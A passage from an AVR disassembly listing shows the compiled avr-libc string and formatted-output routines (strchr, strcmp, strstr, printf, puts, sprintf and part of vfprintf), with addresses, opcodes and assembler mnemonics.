    723c:	86 17       	cp	r24, r22
    723e:	21 f0       	breq	.+8      	; 0x7248 <strchr+0x10>
    7240:	88 23       	and	r24, r24
    7242:	d9 f7       	brne	.-10     	; 0x723a <strchr+0x2>
    7244:	99 27       	eor	r25, r25
    7246:	08 95       	ret
    7248:	31 97       	sbiw	r30, 0x01	; 1
    724a:	cf 01       	movw	r24, r30
    724c:	08 95       	ret

0000724e <strcmp>:
    724e:	fb 01       	movw	r30, r22
    7250:	dc 01       	movw	r26, r24
    7252:	8d 91       	ld	r24, X+
    7254:	01 90       	ld	r0, Z+
    7256:	80 19       	sub	r24, r0
    7258:	01 10       	cpse	r0, r1
    725a:	d9 f3       	breq	.-10     	; 0x7252 <strcmp+0x4>
    725c:	99 0b       	sbc	r25, r25
    725e:	08 95       	ret

00007260 <strstr>:
    7260:	fb 01       	movw	r30, r22
    7262:	51 91       	ld	r21, Z+
    7264:	55 23       	and	r21, r21
    7266:	a9 f0       	breq	.+42     	; 0x7292 <strstr+0x32>
    7268:	bf 01       	movw	r22, r30
    726a:	dc 01       	movw	r26, r24
    726c:	4d 91       	ld	r20, X+
    726e:	45 17       	cp	r20, r21
    7270:	41 11       	cpse	r20, r1
    7272:	e1 f7       	brne	.-8      	; 0x726c <strstr+0xc>
    7274:	59 f4       	brne	.+22     	; 0x728c <strstr+0x2c>
    7276:	cd 01       	movw	r24, r26
    7278:	01 90       	ld	r0, Z+
    727a:	00 20       	and	r0, r0
    727c:	49 f0       	breq	.+18     	; 0x7290 <strstr+0x30>
    727e:	4d 91       	ld	r20, X+
    7280:	40 15       	cp	r20, r0
    7282:	41 11       	cpse	r20, r1
    7284:	c9 f3       	breq	.-14     	; 0x7278 <strstr+0x18>
    7286:	fb 01       	movw	r30, r22
    7288:	41 11       	cpse	r20, r1
    728a:	ef cf       	rjmp	.-34     	; 0x726a <strstr+0xa>
    728c:	81 e0       	ldi	r24, 0x01	; 1
    728e:	90 e0       	ldi	r25, 0x00	; 0
    7290:	01 97       	sbiw	r24, 0x01	; 1
    7292:	08 95       	ret

00007294 <printf>:
    7294:	cf 93       	push	r28
    7296:	df 93       	push	r29
    7298:	cd b7       	in	r28, 0x3d	; 61
    729a:	de b7       	in	r29, 0x3e	; 62
    729c:	ae 01       	movw	r20, r28
    729e:	4b 5f       	subi	r20, 0xFB	; 251
    72a0:	5f 4f       	sbci	r21, 0xFF	; 255
    72a2:	fa 01       	movw	r30, r20
    72a4:	61 91       	ld	r22, Z+
    72a6:	71 91       	ld	r23, Z+
    72a8:	af 01       	movw	r20, r30
    72aa:	80 91 fe 0d 	lds	r24, 0x0DFE	; 0x800dfe <__iob+0x2>
    72ae:	90 91 ff 0d 	lds	r25, 0x0DFF	; 0x800dff <__iob+0x3>
    72b2:	88 d0       	rcall	.+272    	; 0x73c4 <vfprintf>
    72b4:	df 91       	pop	r29
    72b6:	cf 91       	pop	r28
    72b8:	08 95       	ret

000072ba <printf_P>:
    72ba:	0f 93       	push	r16
    72bc:	1f 93       	push	r17
    72be:	cf 93       	push	r28
    72c0:	df 93       	push	r29
    72c2:	cd b7       	in	r28, 0x3d	; 61
    72c4:	de b7       	in	r29, 0x3e	; 62
    72c6:	ae 01       	movw	r20, r28
    72c8:	49 5f       	subi	r20, 0xF9	; 249
    72ca:	5f 4f       	sbci	r21, 0xFF	; 255
    72cc:	da 01       	movw	r26, r20
    72ce:	6d 91       	ld	r22, X+
    72d0:	7d 91       	ld	r23, X+
    72d2:	ad 01       	movw	r20, r26
    72d4:	0c ef       	ldi	r16, 0xFC	; 252
    72d6:	1d e0       	ldi	r17, 0x0D	; 13
    72d8:	f8 01       	movw	r30, r16
    72da:	82 81       	ldd	r24, Z+2	; 0x02
    72dc:	93 81       	ldd	r25, Z+3	; 0x03
    72de:	dc 01       	movw	r26, r24
    72e0:	13 96       	adiw	r26, 0x03	; 3
    72e2:	2c 91       	ld	r18, X
    72e4:	13 97       	sbiw	r26, 0x03	; 3
    72e6:	28 60       	ori	r18, 0x08	; 8
    72e8:	13 96       	adiw	r26, 0x03	; 3
    72ea:	2c 93       	st	X, r18
    72ec:	6b d0       	rcall	.+214    	; 0x73c4 <vfprintf>
    72ee:	d8 01       	movw	r26, r16
    72f0:	12 96       	adiw	r26, 0x02	; 2
    72f2:	ed 91       	ld	r30, X+
    72f4:	fc 91       	ld	r31, X
    72f6:	13 97       	sbiw	r26, 0x03	; 3
    72f8:	23 81       	ldd	r18, Z+3	; 0x03
    72fa:	27 7f       	andi	r18, 0xF7	; 247
    72fc:	23 83       	std	Z+3, r18	; 0x03
    72fe:	df 91       	pop	r29
    7300:	cf 91       	pop	r28
    7302:	1f 91       	pop	r17
    7304:	0f 91       	pop	r16
    7306:	08 95       	ret

00007308 <puts>:
    7308:	0f 93       	push	r16
    730a:	1f 93       	push	r17
    730c:	cf 93       	push	r28
    730e:	df 93       	push	r29
    7310:	e0 91 fe 0d 	lds	r30, 0x0DFE	; 0x800dfe <__iob+0x2>
    7314:	f0 91 ff 0d 	lds	r31, 0x0DFF	; 0x800dff <__iob+0x3>
    7318:	23 81       	ldd	r18, Z+3	; 0x03
    731a:	21 ff       	sbrs	r18, 1
    731c:	1b c0       	rjmp	.+54     	; 0x7354 <puts+0x4c>
    731e:	8c 01       	movw	r16, r24
    7320:	d0 e0       	ldi	r29, 0x00	; 0
    7322:	c0 e0       	ldi	r28, 0x00	; 0
    7324:	f8 01       	movw	r30, r16
    7326:	81 91       	ld	r24, Z+
    7328:	8f 01       	movw	r16, r30
    732a:	60 91 fe 0d 	lds	r22, 0x0DFE	; 0x800dfe <__iob+0x2>
    732e:	70 91 ff 0d 	lds	r23, 0x0DFF	; 0x800dff <__iob+0x3>
    7332:	db 01       	movw	r26, r22
    7334:	18 96       	adiw	r26, 0x08	; 8
    7336:	ed 91       	ld	r30, X+
    7338:	fc 91       	ld	r31, X
    733a:	19 97       	sbiw	r26, 0x09	; 9
    733c:	88 23       	and	r24, r24
    733e:	31 f0       	breq	.+12     	; 0x734c <puts+0x44>
    7340:	09 95       	icall
    7342:	89 2b       	or	r24, r25
    7344:	79 f3       	breq	.-34     	; 0x7324 <puts+0x1c>
    7346:	df ef       	ldi	r29, 0xFF	; 255
    7348:	cf ef       	ldi	r28, 0xFF	; 255
    734a:	ec cf       	rjmp	.-40     	; 0x7324 <puts+0x1c>
    734c:	8a e0       	ldi	r24, 0x0A	; 10
    734e:	09 95       	icall
    7350:	89 2b       	or	r24, r25
    7352:	19 f0       	breq	.+6      	; 0x735a <puts+0x52>
    7354:	8f ef       	ldi	r24, 0xFF	; 255
    7356:	9f ef       	ldi	r25, 0xFF	; 255
    7358:	02 c0       	rjmp	.+4      	; 0x735e <puts+0x56>
    735a:	8d 2f       	mov	r24, r29
    735c:	9c 2f       	mov	r25, r28
    735e:	df 91       	pop	r29
    7360:	cf 91       	pop	r28
    7362:	1f 91       	pop	r17
    7364:	0f 91       	pop	r16
    7366:	08 95       	ret

00007368 <sprintf>:
    7368:	0f 93       	push	r16
    736a:	1f 93       	push	r17
    736c:	cf 93       	push	r28
    736e:	df 93       	push	r29
    7370:	cd b7       	in	r28, 0x3d	; 61
    7372:	de b7       	in	r29, 0x3e	; 62
    7374:	2e 97       	sbiw	r28, 0x0e	; 14
    7376:	0f b6       	in	r0, 0x3f	; 63
    7378:	f8 94       	cli
    737a:	de bf       	out	0x3e, r29	; 62
    737c:	0f be       	out	0x3f, r0	; 63
    737e:	cd bf       	out	0x3d, r28	; 61
    7380:	0d 89       	ldd	r16, Y+21	; 0x15
    7382:	1e 89       	ldd	r17, Y+22	; 0x16
    7384:	86 e0       	ldi	r24, 0x06	; 6
    7386:	8c 83       	std	Y+4, r24	; 0x04
    7388:	1a 83       	std	Y+2, r17	; 0x02
    738a:	09 83       	std	Y+1, r16	; 0x01
    738c:	8f ef       	ldi	r24, 0xFF	; 255
    738e:	9f e7       	ldi	r25, 0x7F	; 127
    7390:	9e 83       	std	Y+6, r25	; 0x06
    7392:	8d 83       	std	Y+5, r24	; 0x05
    7394:	ae 01       	movw	r20, r28
    7396:	47 5e       	subi	r20, 0xE7	; 231
    7398:	5f 4f       	sbci	r21, 0xFF	; 255
    739a:	6f 89       	ldd	r22, Y+23	; 0x17
    739c:	78 8d       	ldd	r23, Y+24	; 0x18
    739e:	ce 01       	movw	r24, r28
    73a0:	01 96       	adiw	r24, 0x01	; 1
    73a2:	10 d0       	rcall	.+32     	; 0x73c4 <vfprintf>
    73a4:	ef 81       	ldd	r30, Y+7	; 0x07
    73a6:	f8 85       	ldd	r31, Y+8	; 0x08
    73a8:	e0 0f       	add	r30, r16
    73aa:	f1 1f       	adc	r31, r17
    73ac:	10 82       	st	Z, r1
    73ae:	2e 96       	adiw	r28, 0x0e	; 14
    73b0:	0f b6       	in	r0, 0x3f	; 63
    73b2:	f8 94       	cli
    73b4:	de bf       	out	0x3e, r29	; 62
    73b6:	0f be       	out	0x3f, r0	; 63
    73b8:	cd bf       	out	0x3d, r28	; 61
    73ba:	df 91       	pop	r29
    73bc:	cf 91       	pop	r28
    73be:	1f 91       	pop	r17
    73c0:	0f 91       	pop	r16
    73c2:	08 95       	ret

000073c4 <vfprintf>:
    73c4:	2f 92       	push	r2
    73c6:	3f 92       	push	r3
    73c8:	4f 92       	push	r4
    73ca:	5f 92       	push	r5
    73cc:	6f 92       	push	r6
    73ce:	7f 92       	push	r7
    73d0:	8f 92       	push	r8
    73d2:	9f 92       	push	r9
    73d4:	af 92       	push	r10
    73d6:	bf 92       	push	r11
    73d8:	cf 92       	push	r12
    73da:	df 92       	push	r13
    73dc:	ef 92       	push	r14
    73de:	ff 92       	push	r15
    73e0:	0f 93       	push	r16
    73e2:	1f 93       	push	r17
    73e4:	cf 93       	push	r28
    73e6:	df 93       	push	r29
    73e8:	cd b7       	in	r28, 0x3d	; 61
    73ea:	de b7       	in	r29, 0x3e	; 62
    73ec:	2b 97       	sbiw	r28, 0x0b	; 11
    73ee:	0f b6       	in	r0, 0x3f	; 63
    73f0:	f8 94       	cli
    73f2:	de bf       	out	0x3e, r29	; 62
    73f4:	0f be       	out	0x3f, r0	; 63
    73f6:	cd bf       	out	0x3d, r28	; 61
    73f8:	6c 01       	movw	r12, r24
    73fa:	7b 01       	movw	r14, r22
    73fc:	8a 01       	movw	r16, r20
    73fe:	fc 01       	movw	r30, r24
    7400:	17 82       	std	Z+7, r1	; 0x07
    7402:	16 82       	std	Z+6, r1	; 0x06
    7404:	83 81       	ldd	r24, Z+3	; 0x03
    7406:	81 ff       	sbrs	r24, 1
    7408:	bf c1       	rjmp	.+894    	; 0x7788 <vfprintf+0x3c4>
    740a:	ce 01       	movw	r24, r28
    740c:	01 96       	adiw	r24, 0x01	; 1
    740e:	3c 01       	movw	r6, r24
    7410:	f6 01       	movw	r30, r12
    7412:	93 81       	ldd	r25, Z+3	; 0x03
    7414:	f7 01       	movw	r30, r14
    7416:	93 fd       	sbrc	r25, 3
    7418:	85 91       	lpm	r24, Z+
    741a:	93 ff       	sbrs	r25, 3
    741c:	81 91       	ld	r24, Z+
    741e:	7f 01       	movw	r14, r30
    7420:	88 23       	and	r24, r24
    7422:	09 f4       	brne	.+2      	; 0x7426 <vfprintf+0x62>
    7424:	ad c1       	rjmp	.+858    	; 0x7780 <vfprintf+0x3bc>
    7426:	85 32       	cpi	r24, 0x25	; 37
    7428:	39 f4       	brne	.+14     	; 0x7438 <vfprintf+0x74>
    742a:	93 fd       	sbrc	r25, 3
    742c:	85 91       	lpm	r24, Z+
    742e:	93 ff       	sbrs	r25, 3
    7430:	81 91       	ld	r24, Z+
    7432:	7f 01       	movw	r14, r30
    7434:	85 32       	cpi	r24, 0x25	; 37
    7436:	21 f4       	brne	.+8      	; 0x7440 <vfprintf+0x7c>
    7438:	b6 01       	movw	r22, r12
    743a:	90 e0       	ldi	r25, 0x00	; 0
    743c:	d9 d1       	rcall	.+946    	; 0x77f0 <fputc>
    743e:	e8 cf       	rjmp	.-48     	; 0x7410 <vfprintf+0x4c>
    7440:	91 2c       	mov	r9, r1
    7442:	21 2c       	mov	r2, r1
    7444:	31 2c       	mov	r3, r1
    7446:	ff e1       	ldi	r31, 0x1F	; 31
    7448:	f3 15       	cp	r31, r3
    744a:	d8 f0       	brcs	.+54     	; 0x7482 <vfprintf+0xbe>
    744c:	8b 32       	cpi	r24, 0x2B	; 43
    744e:	79 f0       	breq	.+30     	; 0x746e <vfprintf+0xaa>
    7450:	38 f4       	brcc	.+14     	; 0x7460 <vfprintf+0x9c>
    7452:	80 32       	cpi	r24, 0x20	; 32
    7454:	79 f0       	breq	.+30     	; 0x7474 <vfprintf+0xb0>
    7456:	83 32       	cpi	r24, 0x23	; 35
    7458:	a1 f4       	brne	.+40     	; 0x7482 <vfprintf+0xbe>
    745a:	23 2d       	mov	r18, r3
    745c:	20 61       	ori	r18, 0x10	; 16
    745e:	1d c0       	rjmp	.+58     	; 0x749a <vfprintf+0xd6>
    7460:	8d 32       	cpi	r24, 0x2D	; 45
    7462:	61 f0       	breq	.+24     	; 0x747c <vfprintf+0xb8>
    7464:	80 33       	cpi	r24, 0x30	; 48
    7466:	69 f4       	brne	.+26     	; 0x7482 <vfprintf+0xbe>
    7468:	23 2d       	mov	r18, r3
    746a:	21 60       	ori	r18, 0x01	; 1
    746c:	16 c0       	rjmp	.+44     	; 0x749a <vfprintf+0xd6>
    746e:	83 2d       	mov	r24, r3
    7470:	82 60       	ori	r24, 0x02	; 2
    7472:	38 2e       	mov	r3, r24
    7474:	e3 2d       	mov	r30, r3
    7476:	e4 60       	ori	r30, 0x04	; 4
    7478:	3e 2e       	mov	r3, r30
    747a:	2a c0       	rjmp	.+84     	; 0x74d0 <vfprintf+0x10c>
    747c:	f3 2d       	mov	r31, r3
    747e:	f8 60       	ori	r31, 0x08	; 8
    7480:	1d c0       	rjmp	.+58     	; 0x74bc <vfprintf+0xf8>
    7482:	37 fc       	sbrc	r3, 7
    7484:	2d c0       	rjmp	.+90     	; 0x74e0 <vfprintf+0x11c>
    7486:	20 ed       	ldi	r18, 0xD0	; 208
    7488:	28 0f       	add	r18, r24
    748a:	2a 30       	cpi	r18, 0x0A	; 10
    748c:	40 f0       	brcs	.+16     	; 0x749e <vfprintf+0xda>
    748e:	8e 32       	cpi	r24, 0x2E	; 46
    7490:	b9 f4       	brne	.+46     	; 0x74c0 <vfprintf+0xfc>
    7492:	36 fc       	sbrc	r3, 6
    7494:	75 c1       	rjmp	.+746    	; 0x7780 <vfprintf+0x3bc>
    7496:	23 2d       	mov	r18, r3
    7498:	20 64       	ori	r18, 0x40	; 64
    749a:	32 2e       	mov	r3, r18
    749c:	19 c0       	rjmp	.+50     	; 0x74d0 <vfprintf+0x10c>
    749e:	36 fe       	sbrs	r3, 6
    74a0:	06 c0       	rjmp	.+12     	; 0x74ae <vfprintf+0xea>
    74a2:	8a e0       	ldi	r24, 0x0A	; 10
    74a4:	98 9e       	mul	r9, r24
    74a6:	20 0d       	add	r18, r0
    74a8:	11 24       	eor	r1, r1
    74aa:	92 2e       	mov	r9, r18
    74ac:	11 c0       	rjmp	.+34     	; 0x74d0 <vfprintf+0x10c>
    74ae:	ea e0       	ldi	r30, 0x0A	; 10
    74b0:	2e 9e       	mul	r2, r30
    74b2:	20 0d       	add	r18, r0
    74b4:	11 24       	eor	r1, r1
    74b6:	22 2e       	mov	r2, r18
    74b8:	f3 2d       	mov	r31, r3
    74ba:	f0 62       	ori	r31, 0x20	; 32
    74bc:	3f 2e       	mov	r3, r31
    74be:	08 c0       	rjmp	.+16     	; 0x74d0 <vfprintf+0x10c>
    74c0:	8c 36       	cpi	r24, 0x6C	; 108
    74c2:	21 f4       	brne	.+8      	; 0x74cc <vfprintf+0x108>
    74c4:	83 2d       	mov	r24, r3
    74c6:	80 68       	ori	r24, 0x80	; 128
    74c8:	38 2e       	mov	r3, r24
    74ca:	02 c0       	rjmp	.+4      	; 0x74d0 <vfprintf+0x10c>
    74cc:	88 36       	cpi	r24, 0x68	; 104
    74ce:	41 f4       	brne	.+16     	; 0x74e0 <vfprintf+0x11c>
    74d0:	f7 01       	movw	r30, r14
    74d2:	93 fd       	sbrc	r25, 3
    74d4:	85 91       	lpm	r24, Z+
    74d6:	93 ff       	sbrs	r25, 3
    74d8:	81 91       	ld	r24, Z+
    74da:	7f 01       	movw	r14, r30
    74dc:	81 11       	cpse	r24, r1
    74de:	b3 cf       	rjmp	.-154    	; 0x7446 <vfprintf+0x82>
    74e0:	98 2f       	mov	r25, r24
    74e2:	9f 7d       	andi	r25, 0xDF	; 223
    74e4:	95 54       	subi	r25, 0x45	; 69
    74e6:	93 30       	cpi	r25, 0x03	; 3
    74e8:	28 f4       	brcc	.+10     	; 0x74f4 <vfprintf+0x130>
    74ea:	0c 5f       	subi	r16, 0xFC	; 252
    74ec:	1f 4f       	sbci	r17, 0xFF	; 255
    74ee:	9f e3       	ldi	r25, 0x3F	; 63
    74f0:	99 83       	std	Y+1, r25	; 0x01
    74f2:	0d c0       	rjmp	.+26     	; 0x750e <vfprintf+0x14a>
    74f4:	83 36       	cpi	r24, 0x63	; 99
    74f6:	31 f0       	breq	.+12     	; 0x7504 <vfprintf+0x140>
    74f8:	83 37       	cpi	r24, 0x73	; 115
    74fa:	71 f0       	breq	.+28     	; 0x7518 <vfprintf+0x154>
    74fc:	83 35       	cpi	r24, 0x53	; 83
    74fe:	09 f0       	breq	.+2      	; 0x7502 <vfprintf+0x13e>
    7500:	55 c0       	rjmp	.+170    	; 0x75ac <vfprintf+0x1e8>
    7502:	20 c0       	rjmp	.+64     	; 0x7544 <vfprintf+0x180>
    7504:	f8 01       	movw	r30, r16
    7506:	80 81       	ld	r24, Z
    7508:	89 83       	std	Y+1, r24	; 0x01
    750a:	0e 5f       	subi	r16, 0xFE	; 254
    750c:	1f 4f       	sbci	r17, 0xFF	; 255
    750e:	88 24       	eor	r8, r8
    7510:	83 94       	inc	r8
    7512:	91 2c       	mov	r9, r1
    7514:	53 01       	movw	r10, r6
    7516:	12 c0       	rjmp	.+36     	; 0x753c <vfprintf+0x178>
    7518:	28 01       	movw	r4, r16
    751a:	f2 e0       	ldi	r31, 0x02	; 2
    751c:	4f 0e       	add	r4, r31
    751e:	51 1c       	adc	r5, r1
    7520:	f8 01       	movw	r30, r16
    7522:	a0 80       	ld	r10, Z
    7524:	b1 80       	ldd	r11, Z+1	; 0x01
    7526:	36 fe       	sbrs	r3, 6
    7528:	03 c0       	rjmp	.+6      	; 0x7530 <vfprintf+0x16c>
    752a:	69 2d       	mov	r22, r9
    752c:	70 e0       	ldi	r23, 0x00	; 0
    752e:	02 c0       	rjmp	.+4      	; 0x7534 <vfprintf+0x170>
    7530:	6f ef       	ldi	r22, 0xFF	; 255
    7532:	7f ef       	ldi	r23, 0xFF	; 255
    7534:	c5 01       	movw	r24, r10
    7536:	51 d1       	rcall	.+674    	; 0x77da <strnlen>
    7538:	4c 01       	movw	r8, r24
    753a:	82 01       	movw	r16, r4
    753c:	f3 2d       	mov	r31, r3
    753e:	ff 77       	andi	r31, 0x7F	; 127
    7540:	3f 2e       	mov	r3, r31
    7542:	15 c0       	rjmp	.+42     	; 0x756e <vfprintf+0x1aa>
    7544:	28 01       	movw	r4, r16
    7546:	22 e0       	ldi	r18, 0x02	; 2
    7548:	42 0e       	add	r4, r18
    754a:	51 1c       	adc	r5, r1
    754c:	f8 01       	movw	r30, r16
    754e:	a0 80       	ld	r10, Z
    7550:	b1 80       	ldd	r11, Z+1	; 0x01
    7552:	36 fe       	sbrs	r3, 6
    7554:	03 c0       	rjmp	.+6      	; 0x755c <vfprintf+0x198>
    7556:	69 2d       	mov	r22, r9
    7558:	70 e0       	ldi	r23, 0x00	; 0
    755a:	02 c0       	rjmp	.+4      	; 0x7560 <vfprintf+0x19c>
    755c:	6f ef       	ldi	r22, 0xFF	; 255
    755e:	7f ef       	ldi	r23, 0xFF	; 255
    7560:	c5 01       	movw	r24, r10
    7562:	30 d1       	rcall	.+608    	; 0x77c4 <strnlen_P>
    7564:	4c 01       	movw	r8, r24
    7566:	f3 2d       	mov	r31, r3
    7568:	f0 68       	ori	r31, 0x80	; 128
    756a:	3f 2e       	mov	r3, r31
    756c:	82 01       	movw	r16, r4
    756e:	33 fc       	sbrc	r3, 3
    7570:	19 c0       	rjmp	.+50     	; 0x75a4 <vfprintf+0x1e0>
    7572:	82 2d       	mov	r24, r2
    7574:	90 e0       	ldi	r25, 0x00	; 0
    7576:	88 16       	cp	r8, r24
    7578:	99 06       	cpc	r9, r25
    757a:	a0 f4       	brcc	.+40     	; 0x75a4 <vfprintf+0x1e0>
    757c:	b6 01       	movw	r22, r12
    757e:	80 e2       	ldi	r24, 0x20	; 32
    7580:	90 e0       	ldi	r25, 0x00	; 0
    7582:	36 d1       	rcall	.+620    	; 0x77f0 <fputc>
    7584:	2a 94       	dec	r2
    7586:	f5 cf       	rjmp	.-22     	; 0x7572 <vfprintf+0x1ae>
    7588:	f5 01       	movw	r30, r10
    758a:	37 fc       	sbrc	r3, 7
    758c:	85 91       	lpm	r24, Z+
    758e:	37 fe       	sbrs	r3, 7
    7590:	81 91       	ld	r24, Z+
    7592:	5f 01       	movw	r10, r30
    7594:	b6 01       	movw	r22, r12
    7596:	90 e0       	ldi	r25, 0x00	; 0
    7598:	2b d1       	rcall	.+598    	; 0x77f0 <fputc>
    759a:	21 10       	cpse	r2, r1
    759c:	2a 94       	dec	r2
    759e:	21 e0       	ldi	r18, 0x01	; 1
    75a0:	82 1a       	sub	r8, r18
    75a2:	91 08       	sbc	r9, r1
    75a4:	81 14       	cp	r8, r1
    75a6:	91 04       	cpc	r9, r1
    75a8:	79 f7       	brne	.-34     	; 0x7588 <vfprintf+0x1c4>
    75aa:	e1 c0       	rjmp	.+450    	; 0x776e <vfprintf+0x3aa>
    75ac:	84 36       	cpi	r24, 0x64	; 100
    75ae:	11 f0       	breq	.+4      	; 0x75b4 <vfprintf+0x1f0>
    75b0:	89 36       	cpi	r24, 0x69	; 105
    75b2:	39 f5       	brne	.+78     	; 0x7602 <vfprintf+0x23e>
    75b4:	f8 01       	movw	r30, r16
    75b6:	37 fe       	sbrs	r3, 7
    75b8:	07 c0       	rjmp	.+14     	; 0x75c8 <vfprintf+0x204>
    75ba:	60 81       	ld	r22, Z
    75bc:	71 81       	ldd	r23, Z+1	; 0x01
    75be:	82 81       	ldd	r24, Z+2	; 0x02
    75c0:	93 81       	ldd	r25, Z+3	; 0x03
    75c2:	0c 5f       	subi	r16, 0xFC	; 252
    75c4:	1f 4f       	sbci	r17, 0xFF	; 255
    75c6:	08 c0       	rjmp	.+16     	; 0x75d8 <vfprintf+0x214>
    75c8:	60 81       	ld	r22, Z
    75ca:	71 81       	ldd	r23, Z+1	; 0x01
    75cc:	07 2e       	mov	r0, r23
    75ce:	00 0c       	add	r0, r0
    75d0:	88 0b       	sbc	r24, r24
    75d2:	99 0b       	sbc	r25, r25
    75d4:	0e 5f       	subi	r16, 0xFE	; 254
    75d6:	1f 4f       	sbci	r17, 0xFF	; 255
    75d8:	f3 2d       	mov	r31, r3
    75da:	ff 76       	andi	r31, 0x6F	; 111
    75dc:	3f 2e       	mov	r3, r31
    75de:	97 ff       	sbrs	r25, 7
    75e0:	09 c0       	rjmp	.+18     	; 0x75f4 <vfprintf+0x230>
    75e2:	90 95       	com	r25
    75e4:	80 95       	com	r24
    75e6:	70 95       	com	r23
    75e8:	61 95       	neg	r22
    75ea:	7f 4f       	sbci	r23, 0xFF	; 255
    75ec:	8f 4f       	sbci	r24, 0xFF	; 255
    75ee:	9f 4f       	sbci	r25, 0xFF	; 255
    75f0:	f0 68       	ori	r31, 0x80	; 128
    75f2:	3f 2e       	mov	r3, r31
    75f4:	2a e0       	ldi	r18, 0x0A	; 10
    75f6:	30 e0       	ldi	r19, 0x00	; 0
    75f8:	a3 01       	movw	r20, r6
    75fa:	36 d1       	rcall	.+620    	; 0x7868 <__ultoa_invert>
    75fc:	88 2e       	mov	r8, r24
    75fe:	86 18       	sub	r8, r6
    7600:	44 c0       	rjmp	.+136    	; 0x768a <vfprintf+0x2c6>
    7602:	85 37       	cpi	r24, 0x75	; 117
    7604:	31 f4       	brne	.+12     	; 0x7612 <vfprintf+0x24e>
    7606:	23 2d       	mov	r18, r3
    7608:	2f 7e       	andi	r18, 0xEF	; 239
    760a:	b2 2e       	mov	r11, r18
    760c:	2a e0       	ldi	r18, 0x0A	; 10
    760e:	30 e0       	ldi	r19, 0x00	; 0
    7610:	25 c0       	rjmp	.+74     	; 0x765c <vfprintf+0x298>
    7612:	93 2d       	mov	r25, r3
    7614:	99 7f       	andi	r25, 0xF9	; 249
    7616:	b9 2e       	mov	r11, r25
    7618:	8f 36       	cpi	r24, 0x6F	; 111
    761a:	c1 f0       	breq	.+48     	; 0x764c <vfprintf+0x288>
    761c:	18 f4       	brcc	.+6      	; 0x7624 <vfprintf+0x260>
    761e:	88 35       	cpi	r24, 0x58	; 88
    7620:	79 f0       	breq	.+30     	; 0x7640 <vfprintf+0x27c>
    7622:	ae c0       	rjmp	.+348    	; 0x7780 <vfprintf+0x3bc>
    7624:	80 37       	cpi	r24, 0x70	; 112
    7626:	19 f0       	breq	.+6      	; 0x762e <vfprintf+0x26a>
    7628:	88 37       	cpi	r24, 0x78	; 120
    762a:	21 f0       	breq	.+8      	; 0x7634 <vfprintf+0x270>
    762c:	a9 c0       	rjmp	.+338    	; 0x7780 <vfprintf+0x3bc>
    762e:	e9 2f       	mov	r30, r25
    7630:	e0 61       	ori	r30, 0x10	; 16
    7632:	be 2e       	mov	r11, r30
    7634:	b4 fe       	sbrs	r11, 4
    7636:	0d c0       	rjmp	.+26     	; 0x7652 <vfprintf+0x28e>
    7638:	fb 2d       	mov	r31, r11
    763a:	f4 60       	ori	r31, 0x04	; 4
    763c:	bf 2e       	mov	r11, r31
    763e:	09 c0       	rjmp	.+18     	; 0x7652 <vfprintf+0x28e>
    7640:	34 fe       	sbrs	r3, 4
    7642:	0a c0       	rjmp	.+20     	; 0x7658 <vfprintf+0x294>
    7644:	29 2f       	mov	r18, r25
    7646:	26 60       	ori	r18, 0x06	; 6
    7648:	b2 2e       	mov	r11, r18
    764a:	06 c0       	rjmp	.+12     	; 0x7658 <vfprintf+0x294>
    764c:	28 e0       	ldi	r18, 0x08	; 8
    764e:	30 e0       	ldi	r19, 0x00	; 0
    7650:	05 c0       	rjmp	.+10     	; 0x765c <vfprintf+0x298>
    7652:	20 e1       	ldi	r18, 0x10	; 16
    7654:	30 e0       	ldi	r19, 0x00	; 0
    7656:	02 c0       	rjmp	.+4      	; 0x765c <vfprintf+0x298>
    7658:	20 e1       	ldi	r18, 0x10	; 16
    765a:	32 e0       	ldi	r19, 0x02	; 2
    765c:	f8 01       	movw	r30, r16
    765e:	b7 fe       	sbrs	r11, 7
    7660:	07 c0       	rjmp	.+14     	; 0x7670 <vfprintf+0x2ac>
    7662:	60 81       	ld	r22, Z
    7664:	71 81       	ldd	r23, Z+1	; 0x01
    7666:	82 81       	ldd	r24, Z+2	; 0x02
    7668:	93 81       	ldd	r25, Z+3	; 0x03
    766a:	0c 5f       	subi	r16, 0xFC	; 252
    766c:	1f 4f       	sbci	r17, 0xFF	; 255
    766e:	06 c0       	rjmp	.+12     	; 0x767c <vfprintf+0x2b8>
    7670:	60 81       	ld	r22, Z
    7672:	71 81       	ldd	r23, Z+1	; 0x01
    7674:	80 e0       	ldi	r24, 0x00	; 0
    7676:	90 e0       	ldi	r25, 0x00	; 0
    7678:	0e 5f       	subi	r16, 0xFE	; 254
    767a:	1f 4f       	sbci	r17, 0xFF	; 255
    767c:	a3 01       	movw	r20, r6
    767e:	f4 d0       	rcall	.+488    	; 0x7868 <__ultoa_invert>
    7680:	88 2e       	mov	r8, r24
    7682:	86 18       	sub	r8, r6
    7684:	fb 2d       	mov	r31, r11
    7686:	ff 77       	andi	r31, 0x7F	; 127
    7688:	3f 2e       	mov	r3, r31
    768a:	36 fe       	sbrs	r3, 6
    768c:	0d c0       	rjmp	.+26     	; 0x76a8 <vfprintf+0x2e4>
    768e:	23 2d       	mov	r18, r3
    7690:	2e 7f       	andi	r18, 0xFE	; 254
    7692:	a2 2e       	mov	r10, r18
    7694:	89 14       	cp	r8, r9
    7696:	58 f4       	brcc	.+22     	; 0x76ae <vfprintf+0x2ea>
    7698:	34 fe       	sbrs	r3, 4
    769a:	0b c0       	rjmp	.+22     	; 0x76b2 <vfprintf+0x2ee>
    769c:	32 fc       	sbrc	r3, 2
    769e:	09 c0       	rjmp	.+18     	; 0x76b2 <vfprintf+0x2ee>
    76a0:	83 2d       	mov	r24, r3
    76a2:	8e 7e       	andi	r24, 0xEE	; 238
    76a4:	a8 2e       	mov	r10, r24
    76a6:	05 c0       	rjmp	.+10     	; 0x76b2 <vfprintf+0x2ee>
    76a8:	b8 2c       	mov	r11, r8
    76aa:	a3 2c       	mov	r10, r3
    76ac:	03 c0       	rjmp	.+6      	; 0x76b4 <vfprintf+0x2f0>
    76ae:	b8 2c       	mov	r11, r8
    76b0:	01 c0       	rjmp	.+2      	; 0x76b4 <vfprintf+0x2f0>
    76b2:	b9 2c       	mov	r11, r9
    76b4:	a4 fe       	sbrs	r10, 4
    76b6:	0f c0       	rjmp	.+30     	; 0x76d6 <vfprintf+0x312>
    76b8:	fe 01       	movw	r30, r28
    76ba:	e8 0d       	add	r30, r8
    76bc:	f1 1d       	adc	r31, r1
    76be:	80 81       	ld	r24, Z
    76c0:	80 33       	cpi	r24, 0x30	; 48
    76c2:	21 f4       	brne	.+8      	; 0x76cc <vfprintf+0x308>
    76c4:	9a 2d       	mov	r25, r10
    76c6:	99 7e       	andi	r25, 0xE9	; 233
